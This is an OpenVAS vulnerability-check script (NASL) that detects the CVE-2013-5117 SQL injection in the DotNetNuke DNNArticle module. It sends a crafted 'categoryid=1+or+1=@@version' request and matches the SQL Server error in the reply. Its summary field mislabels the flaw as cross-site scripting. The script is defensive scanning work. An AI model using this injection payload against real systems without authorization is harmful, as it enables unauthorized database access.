###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dotnetnuke_dnnarticle_sql_inj_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# DotNetNuke DNNArticle Module SQL Injection Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "
  Impact Level: Application";

if (description)
{
  script_id(803868);
  script_version("$Revision: 11 $");
  script_cve_id("CVE-2013-5117");
  script_bugtraq_id(61788);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-08-19 11:59:21 +0530 (Mon, 19 Aug 2013)");
  script_name("DotNetNuke DNNArticle Module SQL Injection Vulnerability");

  tag_summary =
"This host is installed with DotNetNuke DNNArticle and is prone to cross site
scripting vulnerability.";

  tag_vuldetect =
"Send a crafted HTTP GET request and check whether it is able to read the
SQL server version or not.";

  tag_insight =
"Input passed via the 'categoryid' GET parameter to 'desktopmodules/
dnnarticle/dnnarticlerss.aspx' (when 'moduleid' is set) is not properly
sanitized before being used in a SQL query.";

  tag_impact =
"Successful exploitation will allow remote attackers to manipulate SQL
queries by injecting arbitrary SQL code.";

  tag_affected =
"DotNetNuke DNNArticle module versions 10.0 and prior";

  tag_solution =
"No solution or patch is available as of 19th August, 2013. Information
regarding this issue will updated once the solution details are available.
For updates refer to http://www.zldnn.com";

  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Detection:
  " + tag_vuldetect + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;

  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "impact" , value : tag_impact);
  }

  script_description(desc);
  script_xref(name : "URL" , value : "http://www.osvdb.com/96306");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/54545");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/27602");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/122824");
  script_summary("Check if DotNetNuke DNNArticle is vulnerable to sql injection");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
url = "";
req = "";
res = "";
port = "";
sndReq = "";
rcvRes = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Iterate over the possible directories
foreach dir (make_list("", "/dotnetduke", "/dnnarticle", "/cms", cgi_dirs()))
{
  ## Request for the search.cgi
  sndReq = http_get(item:string(dir, "/default.aspx"), port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq, bodyonly:TRUE);

  ## confirm the Application
  if(rcvRes && ("DesktopModules" >< rcvRes ||
     "DotNetNuke" >< rcvRes || "DNN_HTML" >< rcvRes))
  {

    ## Construct attack request
    url = dir + "/DesktopModules/DNNArticle/DNNArticleRSS.aspx?"+
                "moduleid=0&categoryid=1+or+1=@@version";

    ## Confirm exploit worked by checking the response
    if(http_vuln_check(port:port, url:url, check_header:TRUE,
       pattern:"converting the nvarchar.*Microsoft SQL Server.*([0-9.]+)"))
    {
      security_hole(port);
      exit(0);
    }
  }
}
